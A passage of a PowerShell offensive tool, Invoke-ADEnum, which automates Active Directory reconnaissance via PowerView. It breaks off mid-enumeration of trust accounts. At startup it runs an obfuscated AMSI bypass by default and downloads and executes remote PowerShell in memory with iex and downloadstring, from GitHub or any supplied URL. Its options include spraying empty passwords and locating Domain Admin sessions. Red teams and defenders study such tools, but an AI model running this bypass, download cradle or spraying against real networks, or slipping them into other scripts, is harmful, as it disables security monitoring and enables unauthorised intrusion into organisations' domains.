<#

.SYNOPSIS
Invoke-ADEnum Author: Rob LP (@L3o4j)

.DESCRIPTION
Automate Active Directory Enumeration
Required Dependencies: PowerView
URL: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
PowerView Author: Will Schroeder (@harmj0y)

#>

function Invoke-ADEnum
{
	
    [CmdletBinding()] Param(

        [Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
        [String]
        $Domain,

        [Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [String]
        $Server,
        
        [Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
        [String]
        $Output,
	
	[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
        [String]
        $Exclude,
		
	[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
        [String]
        $CustomURL,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [String]
        $Local,
        
        [Parameter (Mandatory=$False, Position = 6, ValueFromPipeline=$true)]
        [Switch]
        $NoServers,
        
        [Parameter (Mandatory=$False, Position = 7, ValueFromPipeline=$true)]
        [Switch]
        $Workstations,
        
        [Parameter (Mandatory=$False, Position = 8, ValueFromPipeline=$true)]
        [Switch]
        $NoUnsupportedOS,
        
        [Parameter (Mandatory=$False, Position = 9, ValueFromPipeline=$true)]
        [Switch]
        $DomainUsers,
        
        [Parameter (Mandatory=$False, Position = 10, ValueFromPipeline=$true)]
        [Switch]
        $Shares,
        
        [Parameter (Mandatory=$False, Position = 11, ValueFromPipeline=$true)]
        [Switch]
        $FindLocalAdminAccess,
        
        [Parameter (Mandatory=$False, Position = 12, ValueFromPipeline=$true)]
        [Switch]
        $DomainACLs,
        
        [Parameter (Mandatory=$False, Position = 13, ValueFromPipeline=$true)]
        [Switch]
        $GPOsRights,
		
	[Parameter (Mandatory=$False, Position = 14, ValueFromPipeline=$true)]
        [Switch]
        $MoreGPOs,
		
	[Parameter (Mandatory=$False, Position = 15, ValueFromPipeline=$true)]
        [Switch]
        $AllGPOs,
		
	[Parameter (Mandatory=$False, Position = 16, ValueFromPipeline=$true)]
        [Switch]
        $NoLAPS,
		
	[Parameter (Mandatory=$False, Position = 17, ValueFromPipeline=$true)]
        [Switch]
        $LAPSComputers,
		
	[Parameter (Mandatory=$False, Position = 18, ValueFromPipeline=$true)]
        [Switch]
        $NoAppLocker,
		
	[Parameter (Mandatory=$False, Position = 19, ValueFromPipeline=$true)]
        [Switch]
        $NoVulnCertTemplates,
		
	[Parameter (Mandatory=$False, Position = 20, ValueFromPipeline=$true)]
        [Switch]
        $DomainOUs,
		
	[Parameter (Mandatory=$False, Position = 21, ValueFromPipeline=$true)]
        [Switch]
        $MoreOUs,
        
        [Parameter (Mandatory=$False, Position = 22, ValueFromPipeline=$true)]
        [Switch]
        $FindDomainUserLocation,
		
	[Parameter (Mandatory=$False, Position = 23, ValueFromPipeline=$true)]
        [Switch]
        $AllGroups,
		
	[Parameter (Mandatory=$False, Position = 24, ValueFromPipeline=$true)]
        [Switch]
        $TargetsOnly,
		
	[Parameter (Mandatory=$False, Position = 25, ValueFromPipeline=$true)]
        [Switch]
        $Debugging,
		
	[Parameter (Mandatory=$False, Position = 26, ValueFromPipeline=$true)]
        [Switch]
        $NoClear,
		
	[Parameter (Mandatory=$False, Position = 27, ValueFromPipeline=$true)]
        [Switch]
        $AllEnum,
		
	[Parameter (Mandatory=$False, Position = 28, ValueFromPipeline=$true)]
        [Switch]
        $Help,

 	[Parameter (Mandatory=$False, Position = 29, ValueFromPipeline=$true)]
        [Switch]
        $NoDelegation,

 	[Parameter (Mandatory=$False, Position = 30, ValueFromPipeline=$true)]
        [Switch]
        $SecurityGroups,

 	[Parameter (Mandatory=$False, Position = 31, ValueFromPipeline=$true)]
        [Switch]
        $AllDescriptions,

 	[Parameter (Mandatory=$False, Position = 32, ValueFromPipeline=$true)]
        [Switch]
        $RBCD,

 	[Parameter (Mandatory=$False, Position = 33, ValueFromPipeline=$true)]
        [Switch]
        $LAPSExtended,

 	[Parameter (Mandatory=$False, Position = 34, ValueFromPipeline=$true)]
        [Switch]
        $LAPSReadRights,

 	[Parameter (Mandatory=$False, Position = 34, ValueFromPipeline=$true)]
        [Switch]
        $NoBypass,

 	[Parameter (Mandatory=$False, Position = 35, ValueFromPipeline=$true)]
        [Switch]
        $SprayEmptyPasswords

    )
	
	if($Debugging){}
	else{
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}
	
	Set-Variable MaximumHistoryCount 32767
	
	if($help){}
	
	else{
	
		if($Local){ipmo $Local -Force}
		
		else{
			if($CustomURL){
				try{
					iex(new-object net.webclient).downloadstring("$CustomURL")
				}
				catch{
					$errorMessage = $_.Exception.Message
					Write-Host ""
					Write-Host "$errorMessage" -ForegroundColor Red
					Write-Host ""
					break
				}
			}
			
			else{
				try{
					if($NoBypass){}
					else{S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )}
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1')
				}
				catch{
					$errorMessage = $_.Exception.Message
					Write-Host ""
					Write-Host "$errorMessage" -ForegroundColor Red
					Write-Host ""
					break
				}
			}
		}
		
		if($Domain){
			if($Server){}
			else{
				$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
				if($Server){}
				else{$Server = Read-Host "Enter the DC FQDN"}
			}
		}

		elseif($Server -and !$Domain){
			$Domain = Read-Host "Enter the domain name"
			#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
		}
		
	}
    
    # Set the path and filename for the output file
    if($Output){$OutputFilePath = $Output}
    elseif($Domain){$OutputFilePath = "$pwd\Invoke-ADEnum_$Domain.txt"}
    else{$OutputFilePath = "$pwd\Invoke-ADEnum.txt"}
    
	if($TargetsOnly -OR $Help){}
	else{
		# Start capturing the script's output and save it to the file
		Start-Transcript -Path $OutputFilePath | Out-Null
	}
    
	if($NoClear){}
	else{clear}
    
    Write-Host "  _____                 _                      _____  ______                       " -ForegroundColor Red
    Write-Host " |_   _|               | |               /\   |  __ \|  ____|                      " -ForegroundColor Red
    Write-Host "   | |  _ ____   _____ | | _____ ______ /  \  | |  | | |__   _ __  _   _ _ __ ___  " -ForegroundColor Red
    Write-Host "   | | | '_ \ \ / / _ \| |/ / _ \______/ /\ \ | |  | |  __| | '_ \| | | | '_ ' _  \" -ForegroundColor Red
    Write-Host "  _| |_| | | \ V / (_) |   <  __/     / ____ \| |__| | |____| | | | |_| | | | | | |" -ForegroundColor Red
    Write-Host " |_____|_| |_|\_/ \___/|_|\_\___|    /_/    \_\_____/|______|_| |_|\__,_|_| |_| |_|" -ForegroundColor Red
	Write-Host ""
	Write-Host " [+] Rob LP (@L3o4j) https://github.com/Leo4j" -ForegroundColor Yellow
	
	if($Help){
		
		Write-Host "

 [PARAMETERS]" -ForegroundColor Yellow
		Write-Host "
 -CustomURL <URL>		Specify the Server URL where you're hosting PowerView.ps1		-CustomURL http://yourserver.com/PowerView.ps1
 
 -Domain <domain FQDN>		The Domain to enumerate for. If not specified, the tool will enumerate for all the domains it can find
 
 -Exclude <domain FQDN>		Exclude one or more domains from enumeration				-Exclude `"contoso.local,ad.example.org`"
 
 -Local <path-on-disk>		Specify the local path to PowerView.ps1					-Local c:\Windows\Temp\PowerView.ps1
 
 -Output <path-on-disk>		Specify where to save the output from the tool (default is pwd)		-Output C:\Windows\Temp\Invoke-ADEnum.txt

 -Server <DC FQDN or IP>	The DC to bind to (requires you specify a Domain)

"
		Write-Host " [SWITCHES]" -ForegroundColor Yellow
		Write-Host "
 -AllDescriptions		Enumerate description for every domain object
  
 -AllEnum			Enumerate for Everything (may take a long time)
 
 -AllGroups			Enumerate for All Domain Groups
 
 -AllGPOs			List all domain GPOs
 
 -Debugging			Will print errors on screen
 
 -DomainACLs			Enumerate for Domain ACLs
 
 -DomainOUs			Enumerate for Organizational Units
 
 -DomainUsers			Enumerate for Users
 
 -FindDomainUserLocation	Enumerate for Machines where Domain Admins are Logged into
 
 -FindLocalAdminAccess		Enumerate for Machines where the Current User is Local Admin

 -GPOsRights			Enumerate GPOs Rights | Who can Create/Modify/Link GPOs
 
 -Help				Show this Help page
 
 -LAPSComputers			Enumerate for Computer objects where LAPS is enabled

 -LAPSExtended			Enumerate for LAPS Extended Rights

 -LAPSReadRights		Enumerate for Users who can Read LAPS
 
 -MoreGPOs			More enumeration leveraging GPOs
 
 -MoreOUs			More enumeration leveraging Organizational Units
 
 -NoAppLocker			Do not enumerate for AppLocker GPO

 -NoBypass			Do not bypass 4MS1
 
 -NoClear			Do not clear terminal before running

 -NoDelegation			Do enumerate for Unconstrained, Constrained or Resource-Based Constrained Delegation
 
 -NoLAPS			Do not enumerate for LAPS GPO
 
 -NoServers			Do not enumerate for Servers
 
 -NoUnsupportedOS		Do not enumerate for machines running unsupported OS
 
 -NoVulnCertTemplates		Do not enumerate for Misconfigured Certificate Templates

 -RBCD				Check for Resource Based Constrained Delegation

 -SecurityGroups		Enumerate for Security Groups (e.g.: Account Operators, Server Operators, and more...)
 
 -Shares			Enumerate for Shares

 -SprayEmptyPasswords		Sprays Empty Passwords - counts towards Bad-Pwd-Count
 
 -TargetsOnly			Show Target Domains only (Stay in scope) - Will not create a Report

 -Workstations			Enumerate for Workstations

"
		Write-Host " [EXAMPLES]" -ForegroundColor Yellow
		Write-Host "
 Invoke-ADEnum

 Invoke-ADEnum -TargetsOnly -Local C:\Users\m.seitz\Downloads\PowerView.ps1

 Invoke-ADEnum -Domain contoso.local -Server DC01.contoso.local

 Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt

 Invoke-ADEnum -Exclude contoso.local,domain.local -NoVulnCertTemplates

 Invoke-ADEnum -CustomURL http://yourserver.com/Tools/PowerView.ps1

"
		
		break
		
	}
	
	$header = "
		<style>

			h1 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 35px;

			}
			
			h2 {

				font-family: Arial, Helvetica, sans-serif;
				color: #2f9fb3;
				font-size: 20px;

			}
			
			h3 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 20px;

			}

			
			
		   table {
				font-size: 15px;
				border: 0px; 
				font-family: Arial, Helvetica, sans-serif;
			} 
			
			td {
				padding: 8px;
				margin: 0px;
				border: 0;
			}
			
			th {
				background: #395870;
				background: linear-gradient(#49708f, #293f50);
				color: #fff;
				font-size: 15px;
				padding: 10px 15px;
				vertical-align: middle;
			}

			tbody tr:nth-child(even) {
				background: #f0f0f2;
			}

				#CreationDate {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff3300;
				font-size: 12px;

			}

   			.YesStatus {
				color: #ff0000;
			}

			.NoStatus {
				color: #008000;
			}
			
		</style>
	"
	
	$TopLevelBanner = "<h1>Active Directory Audit</h1>"
	
	$EnvironmentTable = [PSCustomObject]@{
		"Ran as User" = "$env:USERDOMAIN\$env:USERNAME"
		Domain = $env:USERDNSDOMAIN
		"Ran on Host" = $env:computername + '.' + $env:USERDNSDOMAIN
		"Date and Time" = Get-Date
	}
	
	$HTMLEnvironmentTable = $EnvironmentTable | ConvertTo-Html -As List -Fragment
    
    # All Domains
    $ParentDomain = (Get-NetDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
    $ChildDomains = (Get-NetDomain -Domain $ParentDomain | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)

    if($ChildDomains){
        $AllDomains = $ParentDomain + "`n"
        foreach($ChildDomain in $ChildDomains){
            $AllDomains += $ChildDomain + "`n"
        }
        $AllDomains = ($AllDomains | Out-String) -split "`n"
        $AllDomains = $AllDomains.Trim()
        $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    }

    else{
    	$AllDomains = $ParentDomain + "`n"
    	$AllDomains = ($AllDomains | Out-String) -split "`n"
        $AllDomains = $AllDomains.Trim()
        $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    }
    
    # Trust Domains (save to variable)
    
    if($Domain -AND $Server) {
        $TrustTargetNames = (Get-DomainTrust -Domain $Domain -Server $Server).TargetName
        $TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
        $TrustTargetNames = $TrustTargetNames.Trim()
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
        $TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $Domain }
    }
    
    else{
        $TrustTargetNames = foreach($AllDomain in $AllDomains){(Get-DomainTrust -Domain $AllDomain).TargetName}
        $TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
        $TrustTargetNames = $TrustTargetNames.Trim()
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
        $TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
        $TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
    }
    
    # Remove Outbound Trust from $AllDomains
    
    if($Domain -AND $Server) {
        $OutboundTrusts = Get-DomainTrust -Domain $Domain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
    }
    
    else{
        $OutboundTrusts = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
    }
    
    $AllDomains = $AllDomains + "`n"
    
    foreach($TrustTargetName in $TrustTargetNames){
    	$AllDomains += $TrustTargetName + "`n"
    }
    
    $AllDomains = ($AllDomains | Out-String) -split "`n"
    $AllDomains = $AllDomains.Trim()
    $AllDomains = $AllDomains | Where-Object { $_ -ne "" }
    $AllDomains = $AllDomains | Sort-Object -Unique
    
    #$AllDomains += $TrustTargetNames
    $PlaceHolderDomains = $AllDomains
    $AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
    
    if($Exclude){
		$ExcludeDomains = $Exclude -split ','
		$AllDomains = $AllDomains | Where-Object { $_ -notin $ExcludeDomains }
	}
	
	$inactiveThreshold = (Get-Date).AddMonths(-6)
	
	#############################################
    ############# Target Domains ################
	#############################################
	
    Write-Host ""
    Write-Host ""
    Write-Host "Target Domains:" -ForegroundColor Cyan

    $functionalLevelMapping = @{
	    0 = 'Windows 2000 Native'
	    1 = 'Windows Server 2003 Interim'
	    2 = 'Windows Server 2003'
	    3 = 'Windows Server 2008'
	    4 = 'Windows Server 2008 R2'
	    5 = 'Windows Server 2012'
	    6 = 'Windows Server 2012 R2'
	    7 = 'Windows Server 2016'
	    8 = 'Windows Server 2019'
	}
    
    if ($Domain -and $Server) {
		$TargetDomain = Get-NetDomain -Domain $Domain
  		$domainRootDSE = [ADSI]("LDAP://" + $TargetDomain + "/RootDSE")
		$domainFunctionalLevel = $domainRootDSE.Get("domainFunctionality")
  		$domainFunctionalLevelName = $functionalLevelMapping[[int]$domainFunctionalLevel]
    
		$TempTargetDomains = [PSCustomObject]@{
				Domain = $TargetDomain.Name
				"NetBIOS Name" = ([ADSI]"LDAP://$Domain").dc -Join " - "
				"Domain SID" = Get-DomainSID -Domain $TargetDomain.Name
    				"Functional Level" = $domainFunctionalLevelName
				Forest = $TargetDomain.Forest
				Parent = $TargetDomain.Parent
				Children = $TargetDomain.Children -join ' - '
				#"Domain Controllers" = $TargetDomain.DomainControllers -join ' - '
			}
    }
	
    else{
		$TempTargetDomains = foreach($AllDomain in $AllDomains){
			$TargetDomain = Get-NetDomain -Domain $AllDomain
   			$domainRootDSE = [ADSI]("LDAP://" + $TargetDomain + "/RootDSE")
      			$domainFunctionalLevel = $domainRootDSE.Get("domainFunctionality")
	 		$domainFunctionalLevelName = $functionalLevelMapping[[int]$domainFunctionalLevel]
			
			[PSCustomObject]@{
				Domain = $TargetDomain.Name
				"NetBIOS Name" = ([ADSI]"LDAP://$AllDomain").dc -Join " - "
				"Domain SID" = Get-DomainSID -Domain $TargetDomain.Name
    				"Functional Level" = $domainFunctionalLevelName
				Forest = $TargetDomain.Forest
				Parent = $TargetDomain.Parent
				Children = $TargetDomain.Children -join ' - '
				#"Domain Controllers" = $TargetDomain.DomainControllers -join ' - '
			}
		}
    }

    if($TempTargetDomains){
		$TempTargetDomains | Sort-Object Forest,Parent,Domain | ft -Autosize -Wrap
		$HTMLTargetDomain = $TempTargetDomains | Sort-Object Forest,Parent,Domain | ConvertTo-Html -Fragment -PreContent "<h2>Target Domains</h2>"
    }
	
	if($TargetsOnly){
		
	    if($Domain -AND $Server) {
			$GetDomainTrusts = Get-DomainTrust -Domain $Domain -Server $Server
			
			$TempGetDomainTrust = foreach ($GetDomainTrust in $GetDomainTrusts) {
				[PSCustomObject]@{
					"Source Name" = $GetDomainTrust.SourceName
					"Target Name" = $GetDomainTrust.TargetName
					"Trust Type" = $GetDomainTrust.TrustType
					"Trust Attributes" = $GetDomainTrust.TrustAttributes
					"Trust Direction" = $GetDomainTrust.TrustDirection
					"When Created" = $GetDomainTrust.WhenCreated
					"When Changed" = $GetDomainTrust.WhenChanged
				}
			}
	    }
	    
	    else{
	        $TempGetDomainTrust = foreach($AllDomain in $AllDomains){
				$GetDomainTrusts = Get-DomainTrust -Domain $AllDomain
				
				foreach ($GetDomainTrust in $GetDomainTrusts) {
					[PSCustomObject]@{
						"Source Name" = $GetDomainTrust.SourceName
						"Target Name" = $GetDomainTrust.TargetName
						"Trust Type" = $GetDomainTrust.TrustType
						"Trust Attributes" = $GetDomainTrust.TrustAttributes
						"Trust Direction" = $GetDomainTrust.TrustDirection
						"When Created" = $GetDomainTrust.WhenCreated
						"When Changed" = $GetDomainTrust.WhenChanged
					}
				}
			}
	    }
	
	    if($TempGetDomainTrust){
     			Write-Host ""
			Write-Host "Domain Trusts:" -ForegroundColor Cyan
			$TempGetDomainTrust | Format-Table -AutoSize -Wrap
		}
    		

		    Write-Host ""
		    Write-Host "Domain Controllers:" -ForegroundColor Cyan
		    if($Domain -AND $Server) {
		        $domainControllers = Get-DomainController -Domain $Domain
		    	$TempHTMLdc = foreach ($dc in $domainControllers) {
		        	$isPrimaryDC = $dc.Roles -like "RidRole"
		        	$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
		        	
					[PSCustomObject]@{
						"DC Name" = $dc.Name
						Forest = $dc.Forest
						Domain = $dc.Domain
      						"OS Version" = $dc.OSVersion
						"IP Address" = $dc.IPAddress
						"Primary DC" = $primaryDC
					}
		    	}
				if($TempHTMLdc){
					$TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ft -Autosize -Wrap
				}
		    }
		    else{
		        $TempHTMLdc = foreach($AllDomain in $AllDomains){
					$domainControllers = Get-DomainController -Domain $AllDomain
		        	foreach ($dc in $domainControllers) {
						$isPrimaryDC = $dc.Roles -like "RidRole"
						$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
						[PSCustomObject]@{
							"DC Name" = $dc.Name
							Forest = $dc.Forest
							Domain = $dc.Domain
       							"OS Version" = $dc.OSVersion
							"IP Address" = $dc.IPAddress
							"Primary DC" = $primaryDC
						}
		        	}
				}
				if($TempHTMLdc ){
					$TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ft -Autosize -Wrap
				}
		    }
		
		Write-Host ""
		Write-Host "Accounts Analysis:" -ForegroundColor Cyan
		
		if ($Domain -and $Server) {
			
			$xDomainUsers = Get-DomainUser -Domain $Domain -Server $Server -Properties Name,userAccountControl
			$DomainComputers = Get-DomainComputer -Domain $Domain -Server $Server -Properties OperatingSystem,userAccountControl,samaccountname

			$QuickDomainAnalysis = [PSCustomObject]@{
				"Enabled Users" = ($xDomainUsers | Where-Object { $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).Name.count
				"Disabled Users" = ($xDomainUsers | Where-Object { $_.userAccountControl -band 2 }).Name.Count
				"Enabled Servers" = ($DomainComputers | Where-Object { $_.OperatingSystem -like "*Server*" -and $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).samaccountname.count
				"Disabled Servers" = ($DomainComputers | Where-Object { $_.OperatingSystem -like "*Server*" -and $_.userAccountControl -match 'ACCOUNTDISABLE' }).samaccountname.count
				"Enabled Workstations"  = ($DomainComputers | Where-Object { $_.OperatingSystem -notlike "*Server*" -and $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).samaccountname.count
				"Disabled Workstations"  = ($DomainComputers | Where-Object { $_.OperatingSystem -notlike "*Server*" -and $_.userAccountControl -match 'ACCOUNTDISABLE' }).samaccountname.count
				Domain = $AllDomain
			}

			$QuickDomainAnalysis | Format-Table -AutoSize -Wrap
		}
		
		else{
			
			$QuickDomainAnalysis = foreach($AllDomain in $AllDomains){
				
				$xDomainUsers = Get-DomainUser -Domain $AllDomain -Properties Name,userAccountControl
				$DomainComputers = Get-DomainComputer -Domain $AllDomain -Properties OperatingSystem,userAccountControl,samaccountname

				[PSCustomObject]@{
					"Enabled Users" = ($xDomainUsers | Where-Object { $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).Name.count
					"Disabled Users" = ($xDomainUsers | Where-Object { $_.userAccountControl -band 2 }).Name.Count
					"Enabled Servers" = ($DomainComputers | Where-Object { $_.OperatingSystem -like "*Server*" -and $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).samaccountname.count
					"Disabled Servers" = ($DomainComputers | Where-Object { $_.OperatingSystem -like "*Server*" -and $_.userAccountControl -match 'ACCOUNTDISABLE' }).samaccountname.count
					"Enabled Workstations"  = ($DomainComputers | Where-Object { $_.OperatingSystem -notlike "*Server*" -and $_.userAccountControl -notmatch 'ACCOUNTDISABLE' }).samaccountname.count
					"Disabled Workstations"  = ($DomainComputers | Where-Object { $_.OperatingSystem -notlike "*Server*" -and $_.userAccountControl -match 'ACCOUNTDISABLE' }).samaccountname.count
					Domain = $AllDomain
				}
				
			}
			
			$QuickDomainAnalysis | ft -Autosize -Wrap
		}
		
		break
	}
	else{}
	
	#############################################
    ############ Krbtgt Accounts ################
	#############################################
	
    Write-Host ""
    Write-Host "Krbtgt Accounts" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$KrbtgtAccount = Get-DomainObject -Identity krbtgt -Domain $Domain

		$TempKrbtgtAccount = [PSCustomObject]@{
				Account = $KrbtgtAccount.samaccountname
				"Account SID"  = $KrbtgtAccount.objectsid
				"When Created" = $KrbtgtAccount.whencreated
				"When Changed" = $KrbtgtAccount.whenchanged
				"Service Principal Name" = $KrbtgtAccount.serviceprincipalname
				Domain = $Domain
			}
    }
    else{
		$TempKrbtgtAccount = foreach($AllDomain in $AllDomains){
			$KrbtgtAccount = Get-DomainObject -Identity krbtgt -Domain $AllDomain
			
			[PSCustomObject]@{
				Account = $KrbtgtAccount.samaccountname
				"Account SID"  = $KrbtgtAccount.objectsid
				"When Created" = $KrbtgtAccount.whencreated
				"When Changed" = $KrbtgtAccount.whenchanged
				"Service Principal Name" = $KrbtgtAccount.serviceprincipalname
				Domain = $AllDomain
			}
		}
    }

    if($TempKrbtgtAccount){
		$TempKrbtgtAccount | Sort-Object Domain | ft -Autosize -Wrap
		$HTMLKrbtgtAccount = $TempKrbtgtAccount | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Krbtgt Accounts</h2>"
	}
	
	#############################################
    ########## Domain Controllers ###############
	#############################################
	
	Write-Host ""
    Write-Host "Domain Controllers:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
        $domainControllers = Get-DomainController -Domain $Domain
    	$TempHTMLdc = foreach ($dc in $domainControllers) {
        	$isPrimaryDC = $dc.Roles -like "RidRole"
        	$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
        	
			[PSCustomObject]@{
				"DC Name" = $dc.Name
				Forest = $dc.Forest
				Domain = $dc.Domain
    				"OS Version" = $dc.OSVersion
				"IP Address" = $dc.IPAddress
				"Primary DC" = $primaryDC
			}
    	}
		if($TempHTMLdc){
			$TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ft -Autosize -Wrap
			$HTMLdc = $TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ConvertTo-Html -Fragment -PreContent "<h2>Domain Controllers</h2>"
		}
    }
    else{
        $TempHTMLdc = foreach($AllDomain in $AllDomains){
			$domainControllers = Get-DomainController -Domain $AllDomain
        	foreach ($dc in $domainControllers) {
				$isPrimaryDC = $dc.Roles -like "RidRole"
				$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
				[PSCustomObject]@{
					"DC Name" = $dc.Name
					Forest = $dc.Forest
					Domain = $dc.Domain
     					"OS Version" = $dc.OSVersion
					"IP Address" = $dc.IPAddress
					"Primary DC" = $primaryDC
				}
        	}
		}
		if($TempHTMLdc ){
			$TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ft -Autosize -Wrap
			$HTMLdc = $TempHTMLdc | Sort-Object Forest,Domain,"DC Name" | ConvertTo-Html -Fragment -PreContent "<h2>Domain Controllers</h2>"
		}
    }
	
	#############################################
    ###### Domains for the current forest #######
	#############################################
    
    Write-Host ""
	Write-Host "Domains for the current forest:" -ForegroundColor Cyan
	$GetForestDomains = Get-ForestDomain
	$TempForestDomain = foreach ($GetForestDomain in $GetForestDomains) {
		[PSCustomObject]@{
			"Domain" = $GetForestDomain.Name
			"Forest" = $GetForestDomain.Forest
			#"Domain Controllers" = $GetForestDomain.DomainControllers -join ', '
			"Parent" = $GetForestDomain.Parent
			"Children" = $GetForestDomain.Children -join ', '
			"Domain Mode" = $GetForestDomain.DomainMode
			"Domain Mode Level" = $GetForestDomain.DomainModeLevel
			"Pdc Role Owner" = $GetForestDomain.PdcRoleOwner
			"Rid Role Owner" = $GetForestDomain.RidRoleOwner
			"Infrastructure Role Owner" = $GetForestDomain.InfrastructureRoleOwner
		}
	}

	if ($TempForestDomain) {
		$TempForestDomain | Sort-Object Domain | Format-Table -AutoSize -Wrap
		$HTMLForestDomain = $TempForestDomain | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Domains for the current forest</h2>"
	}

    #############################################
    ########### Forest Global Catalog ###########
	#############################################
	
	Write-Host ""
	Write-Host "Forest Global Catalog:" -ForegroundColor Cyan
	$GetForestGlobalCatalog = Get-ForestGlobalCatalog
	$TempForestGlobalCatalog = foreach ($GC in $GetForestGlobalCatalog) {
		[PSCustomObject]@{
			"DC Name" = $GC.Name
			"Forest" = $GC.Forest
			"Domain" = $GC.Domain
			"OS Version" = $GC.OSVersion
			"IP Address" = $GC.IPAddress
		}
	}

	if ($TempForestGlobalCatalog) {
		$TempForestGlobalCatalog | Sort-Object Forest,Domain,"DC Name" | Format-Table -AutoSize -Wrap
		$HTMLForestGlobalCatalog = $TempForestGlobalCatalog | Sort-Object Forest,Domain,"DC Name" | ConvertTo-Html -Fragment -PreContent "<h2>Forest Global Catalog</h2>"
	}


    #############################################
    ############### Domain Trusts ###############
	#############################################
	
	Write-Host ""
	Write-Host "Domain Trusts:" -ForegroundColor Cyan
	
    if($Domain -AND $Server) {
		$GetDomainTrusts = Get-DomainTrust -Domain $Domain -Server $Server
		
		$TempGetDomainTrust = foreach ($GetDomainTrust in $GetDomainTrusts) {
			[PSCustomObject]@{
				"Source Name" = $GetDomainTrust.SourceName
				"Target Name" = $GetDomainTrust.TargetName
				"Trust Type" = $GetDomainTrust.TrustType
				"Trust Attributes" = $GetDomainTrust.TrustAttributes
				"Trust Direction" = $GetDomainTrust.TrustDirection
				"When Created" = $GetDomainTrust.WhenCreated
				"When Changed" = $GetDomainTrust.WhenChanged
			}
		}
    }
    
    else{
        $TempGetDomainTrust = foreach($AllDomain in $AllDomains){
			$GetDomainTrusts = Get-DomainTrust -Domain $AllDomain
			
			foreach ($GetDomainTrust in $GetDomainTrusts) {
				[PSCustomObject]@{
					"Source Name" = $GetDomainTrust.SourceName
					"Target Name" = $GetDomainTrust.TargetName
					"Trust Type" = $GetDomainTrust.TrustType
					"Trust Attributes" = $GetDomainTrust.TrustAttributes
					"Trust Direction" = $GetDomainTrust.TrustDirection
					"When Created" = $GetDomainTrust.WhenCreated
					"When Changed" = $GetDomainTrust.WhenChanged
				}
			}
		}
    }

    if($TempGetDomainTrust){
		$TempGetDomainTrust | Format-Table -AutoSize -Wrap
		$HTMLGetDomainTrust = $TempGetDomainTrust | ConvertTo-Html -Fragment -PreContent "<h2>Domain Trusts</h2>"
	}
	
	#############################################
    ############## Trust Accounts ###############
	#############################################
    
    Write-Host ""
    Write-Host "Trust Accounts:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$TrustAccounts = Get-DomainObject -Domain $Domain -Server $Server -LDAPFilter "(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2048)"
		
		$TempTrustAccounts = foreach($TrustAccount in $TrustAccounts){
			
			[PSCustomObject]@{
				Domain = $Domain
				"SAM Account Name" = $TrustAccount.samaccountname
				"Object SID" = $TrustAccount.objectsid
				"Object GUID" = $TrustAccount.objectguid
